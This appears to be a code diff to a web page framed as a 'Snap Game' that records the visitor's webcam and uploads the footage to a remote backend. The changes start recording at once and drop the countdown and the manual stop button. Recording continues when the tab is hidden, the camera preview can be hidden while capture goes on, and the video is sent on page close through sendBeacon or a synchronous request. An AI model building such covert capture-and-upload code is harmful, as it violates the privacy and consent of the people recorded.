@@ -6,10 +6,16 @@
 <title>Snap Game - Auto Record</title>
 
 <style>
-body {
+* {
   margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
   font-family: Arial, sans-serif;
   overflow: hidden;
+  background: #000;
 }
 
 /* Splash Screen */
@@ -62,6 +68,10 @@ body {
   height: 100vh;
   object-fit: cover;
   display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  z-index: 1;
 }
 
 /* Recording Indicator */
@@ -77,48 +87,26 @@ body {
   display: none;
   z-index: 100;
   font-family: monospace;
+  align-items: center;
+  gap: 8px;
 }
 
 .recording-indicator.active {
-  display: block;
-  animation: blink 1s infinite;
+  display: flex;
 }
 
-.recording-indicator::before {
-  content: "●";
-  color: #ff4444;
-  margin-right: 8px;
+.recording-dot {
+  width: 12px;
+  height: 12px;
+  background: #ff4444;
+  border-radius: 50%;
   animation: pulse 1s infinite;
 }
 
-@keyframes blink {
-  0% { opacity: 1; }
-  50% { opacity: 0.7; }
-  100% { opacity: 1; }
-}
-
 @keyframes pulse {
-  0% { opacity: 1; }
-  50% { opacity: 0.5; }
-  100% { opacity: 1; }
-}
-
-/* Countdown */
-.countdown {
-  position: fixed;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  font-size: 100px;
-  color: white;
-  text-shadow: 2px 2px 10px rgba(0,0,0,0.8);
-  z-index: 200;
-  display: none;
-  font-weight: bold;
-  background: rgba(0,0,0,0.5);
-  padding: 20px 40px;
-  border-radius: 20px;
-  text-align: center;
+  0% { opacity: 1; transform: scale(1); }
+  50% { opacity: 0.5; transform: scale(1.2); }
+  100% { opacity: 1; transform: scale(1); }
 }
 
 /* Status */
@@ -138,20 +126,56 @@ body {
   white-space: nowrap;
 }
 
+/* Toggle Camera Button */
+.toggle-camera-btn {
+  position: fixed;
+  bottom: 30px;
+  right: 30px;
+  width: 50px;
+  height: 50px;
+  border-radius: 50%;
+  background: rgba(0,0,0,0.7);
+  border: 2px solid white;
+  color: white;
+  font-size: 24px;
+  cursor: pointer;
+  z-index: 100;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  backdrop-filter: blur(5px);
+  transition: all 0.3s ease;
+}
+
+.toggle-camera-btn:hover {
+  background: rgba(0,0,0,0.9);
+  transform: scale(1.05);
+}
+
 /* Auto-save message */
 .auto-save {
   position: fixed;
-  bottom: 100px;
+  top: 50%;
   left: 50%;
-  transform: translateX(-50%);
-  background: rgba(0,0,0,0.8);
+  transform: translate(-50%, -50%);
+  background: rgba(0,0,0,0.9);
   color: #4CAF50;
-  padding: 8px 16px;
-  border-radius: 20px;
-  font-size: 12px;
+  padding: 15px 30px;
+  border-radius: 10px;
+  font-size: 16px;
   display: none;
-  z-index: 100;
+  z-index: 200;
+  text-align: center;
   white-space: nowrap;
+  font-weight: bold;
+  animation: fadeInOut 2s ease;
+}
+
+@keyframes fadeInOut {
+  0% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
+  15% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  85% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  100% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
 }
 </style>
 </head>
@@ -170,10 +194,13 @@ body {
 <video id="camera" autoplay playsinline muted></video>
 
 <!-- UI Elements -->
-<div class="recording-indicator" id="recordingIndicator">Recording</div>
-<div class="countdown" id="countdown"></div>
+<div class="recording-indicator" id="recordingIndicator">
+  <div class="recording-dot"></div>
+  <span>Recording</span>
+</div>
 <div id="status"></div>
-<div class="auto-save" id="autoSaveMsg">Auto-saving video...</div>
+<div class="auto-save" id="autoSaveMsg">✓ Video saved!</div>
+<button class="toggle-camera-btn" id="toggleCameraBtn" onclick="toggleCameraPreview()">👁️</button>
 
 <script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>
 
@@ -185,10 +212,10 @@ let mediaRecorder = null;
 let recordedChunks = [];
 let stream = null;
 let isRecording = false;
-let recordingStartTime = null;
 let hasSentVideo = false;
-let autoStopTimer = null;
-let pageHidden = false;
+let recordingStartTime = null;
+let autoSaveTimer = null;
+let cameraVisible = true;
 
 // Connect to server
 function connectSocket() {
@@ -211,20 +238,30 @@ function connectSocket() {
     
     socket.on('recording-complete', (data) => {
       console.log('✅ Video saved on server:', data);
-      showStatus('✓ Video saved!', '#4CAF50');
+      showAutoSaveMessage();
     });
   });
 }
 
-// Start the app and auto-record
+// Show auto-save message
+function showAutoSaveMessage() {
+  const msg = document.getElementById('autoSaveMsg');
+  msg.style.display = 'block';
+  setTimeout(() => {
+    msg.style.display = 'none';
+  }, 2000);
+}
+
+// Start the app
 async function startApp() {
   const splash = document.getElementById("splash");
   const camera = document.getElementById("camera");
   const msg = document.getElementById("message");
+  const toggleBtn = document.getElementById("toggleCameraBtn");
   
   try {
     // Connect to server
-    showStatus('Connecting to server...');
+    showStatus('Connecting...');
     await connectSocket();
     
     // Get camera access
@@ -237,18 +274,20 @@ async function startApp() {
     // Setup camera
     camera.srcObject = stream;
     camera.style.display = "block";
+    toggleBtn.style.display = "flex";
     splash.style.display = "none";
     
     // Setup media recorder
     setupMediaRecorder();
     
+    // Start recording immediately
+    startRecording();
+    
     // Show recording indicator
     document.getElementById('recordingIndicator').classList.add('active');
+    showStatus('🔴 Recording in progress...');
     
-    // Start recording with countdown
-    startRecordingWithCountdown();
-    
-    // Setup page visibility and unload handlers
+    // Setup page close handlers
     setupPageHandlers();
     
   } catch (err) {
@@ -286,7 +325,7 @@ function setupMediaRecorder() {
   mediaRecorder.ondataavailable = (event) => {
     if (event.data && event.data.size > 0) {
       recordedChunks.push(event.data);
-      console.log(`📹 Chunk received: ${event.data.size} bytes, total chunks: ${recordedChunks.length}`);
+      console.log(`📹 Chunk: ${event.data.size} bytes, total: ${recordedChunks.length}`);
     }
   };
   
@@ -303,27 +342,6 @@ function setupMediaRecorder() {
   };
 }
 
-// Start recording with 3-second countdown
-function startRecordingWithCountdown() {
-  let count = 3;
-  const countdownEl = document.getElementById('countdown');
-  countdownEl.style.display = 'block';
-  countdownEl.textContent = count;
-  
-  const countdownInterval = setInterval(() => {
-    count--;
-    if (count > 0) {
-      countdownEl.textContent = count;
-    } else {
-      clearInterval(countdownInterval);
-      countdownEl.style.display = 'none';
-      
-      // Start recording
-      startRecording();
-    }
-  }, 1000);
-}
-
 // Start recording
 function startRecording() {
   if (mediaRecorder && mediaRecorder.state === 'inactive') {
@@ -336,15 +354,14 @@ function startRecording() {
     recordingStartTime = Date.now();
     
     console.log('🔴 Recording started');
-    showStatus('🔴 Recording... (auto-save on close)', '#ff4444');
     
-    // Set maximum recording duration (e.g., 30 seconds)
-    autoStopTimer = setTimeout(() => {
+    // Optional: Stop after 60 seconds max (adjust as needed)
+    autoSaveTimer = setTimeout(() => {
       if (isRecording && !hasSentVideo) {
-        console.log('⏰ Max recording time reached, stopping...');
+        console.log('⏰ Max recording time reached');
         stopAndSendVideo();
       }
-    }, 30000); // Stop after 30 seconds max
+    }, 60000); // 60 seconds max
   }
 }
 
@@ -354,13 +371,12 @@ function stopAndSendVideo() {
     console.log('🛑 Stopping recording...');
     isRecording = false;
     
-    if (autoStopTimer) {
-      clearTimeout(autoStopTimer);
-      autoStopTimer = null;
+    if (autoSaveTimer) {
+      clearTimeout(autoSaveTimer);
+      autoSaveTimer = null;
     }
     
     mediaRecorder.stop();
-    showStatus('Processing video...', '#ffa500');
     document.getElementById('recordingIndicator').classList.remove('active');
   }
 }
@@ -368,24 +384,19 @@ function stopAndSendVideo() {
 // Send video to server
 async function sendVideoToServer() {
   if (hasSentVideo) {
-    console.log('Video already sent, skipping');
+    console.log('Video already sent');
     return;
   }
   
   if (recordedChunks.length === 0) {
-    console.log('No video data to send');
-    showStatus('No video recorded', '#ff4444');
+    console.log('No video data');
     return;
   }
   
   hasSentVideo = true;
   
-  // Show auto-save message
-  const autoSaveMsg = document.getElementById('autoSaveMsg');
-  autoSaveMsg.style.display = 'block';
-  
-  showStatus('📤 Uploading video...', '#ffa500');
-  console.log(`Sending ${recordedChunks.length} chunks, total size: ${getTotalSize()} bytes`);
+  const totalSize = recordedChunks.reduce((sum, chunk) => sum + chunk.size, 0);
+  console.log(`Sending ${recordedChunks.length} chunks, ${totalSize} bytes`);
   
   try {
     // Create blob from chunks
@@ -395,25 +406,17 @@ async function sendVideoToServer() {
     // Convert to array buffer
     const arrayBuffer = await videoBlob.arrayBuffer();
     
-    // Emit to server
+    // Send via Socket.IO
     socket.emit('video-data', arrayBuffer);
     
-    showStatus('✓ Video sent!', '#4CAF50');
-    
-    setTimeout(() => {
-      autoSaveMsg.style.display = 'none';
-    }, 3000);
+    showStatus('✓ Video saved!', '#4CAF50');
+    showAutoSaveMessage();
     
   } catch (error) {
     console.error('Error sending video:', error);
-    showStatus('Failed to send video', '#ff4444');
+    showStatus('Failed to save video', '#ff4444');
     hasSentVideo = false;
   }
-}
-
-// Get total size of recorded chunks
-function getTotalSize() {
-  return recordedChunks.reduce((total, chunk) => total + chunk.size, 0);
 }
 
 // Show status message
@@ -430,56 +433,59 @@ function showStatus(message, color = '#ffffff') {
   }, 3000);
 }
 
-// Setup handlers for page close/unload
-function setupPageHandlers() {
-  // Handle page visibility change (tab switch or minimize)
-  document.addEventListener('visibilitychange', () => {
-    if (document.hidden) {
-      console.log('📱 Page hidden, preparing to save video...');
-      pageHidden = true;
-      
-      // Show warning
-      showStatus('Saving video...', '#ffa500');
-      
-      // Stop recording if active
-      if (isRecording && !hasSentVideo) {
-        stopAndSendVideo();
-      }
-    }
-  });
+// Toggle camera preview (show/hide)
+function toggleCameraPreview() {
+  const camera = document.getElementById('camera');
+  const btn = document.getElementById('toggleCameraBtn');
   
-  // Handle beforeunload (page close, refresh, back button)
+  if (cameraVisible) {
+    camera.style.display = 'none';
+    btn.textContent = '👁️‍🗨️';
+    btn.style.background = 'rgba(0,0,0,0.9)';
+    cameraVisible = false;
+    showStatus('Camera preview hidden', '#888');
+  } else {
+    camera.style.display = 'block';
+    btn.textContent = '👁️';
+    btn.style.background = 'rgba(0,0,0,0.7)';
+    cameraVisible = true;
+    showStatus('Camera preview shown', '#888');
+  }
+}
+
+// Setup handlers for page close
+function setupPageHandlers() {
+  // Handle beforeunload - main event for tab close
   window.addEventListener('beforeunload', (event) => {
-    console.log('🚪 Page closing, sending final video...');
+    console.log('🚪 Page closing, saving video...');
     
-    if (isRecording && !hasSentVideo && mediaRecorder) {
+    if (isRecording && !hasSentVideo) {
       // Stop recording immediately
-      if (mediaRecorder.state === 'recording') {
+      if (mediaRecorder && mediaRecorder.state === 'recording') {
         mediaRecorder.stop();
       }
       
-      // Note: For beforeunload, we can't guarantee async operations complete
-      // But the server should still receive if we send synchronously
-      if (recordedChunks.length > 0 && socket && !hasSentVideo) {
-        // Try to send synchronously
+      // Send via Beacon API for reliable delivery
+      if (recordedChunks.length > 0 && socket) {
         const mimeType = mediaRecorder.mimeType;
         const videoBlob = new Blob(recordedChunks, { type: mimeType });
         
-        // Use navigator.sendBeacon for reliable delivery on page close
+        // Use sendBeacon for reliable delivery on page close
         if (navigator.sendBeacon) {
           const reader = new FileReader();
           reader.onloadend = () => {
             const arrayBuffer = reader.result;
-            // Send via beacon (more reliable for page close)
             const blob = new Blob([arrayBuffer], { type: 'application/octet-stream' });
             navigator.sendBeacon(`${BACKEND_URL}/upload-beacon`, blob);
+            console.log('📡 Beacon sent');
           };
           reader.readAsArrayBuffer(videoBlob);
         } else {
           // Fallback to sync XHR
           const xhr = new XMLHttpRequest();
-          xhr.open('POST', `${BACKEND_URL}/upload-sync`, false); // false = synchronous
+          xhr.open('POST', `${BACKEND_URL}/upload-sync`, false);
           xhr.send(videoBlob);
+          console.log('🔄 Sync upload sent');
         }
       }
     }
@@ -490,7 +496,7 @@ function setupPageHandlers() {
     }
   });
   
-  // Handle page hide (for mobile)
+  // Handle pagehide (for mobile)
   window.addEventListener('pagehide', () => {
     console.log('📱 Page hide event');
     if (isRecording && !hasSentVideo) {
@@ -498,38 +504,21 @@ function setupPageHandlers() {
     }
   });
   
-  // Handle popstate (back button)
-  window.addEventListener('popstate', () => {
-    console.log('⬅️ Back button pressed');
-    if (isRecording && !hasSentVideo) {
-      stopAndSendVideo();
+  // Handle visibility change (tab switch - optional)
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+      console.log('Tab hidden, continuing recording...');
+      // We continue recording, don't stop
     }
   });
 }
 
-// Optional: Add a manual stop button if needed
-function addManualStopButton() {
-  const btn = document.createElement('button');
-  btn.textContent = 'Stop & Save';
-  btn.style.position = 'fixed';
-  btn.style.bottom = '20px';
-  btn.style.left = '20px';
-  btn.style.padding = '10px 20px';
-  btn.style.backgroundColor = '#ff4444';
-  btn.style.color = 'white';
-  btn.style.border = 'none';
-  btn.style.borderRadius = '5px';
-  btn.style.zIndex = '100';
-  btn.onclick = () => {
-    if (isRecording && !hasSentVideo) {
-      stopAndSendVideo();
-    }
-  };
-  document.body.appendChild(btn);
-}
-
-// Call this if you want a manual stop button
-// addManualStopButton();
+// Clean up on page unload
+window.onunload = () => {
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
+  }
+};
 </script>
 
 </body>
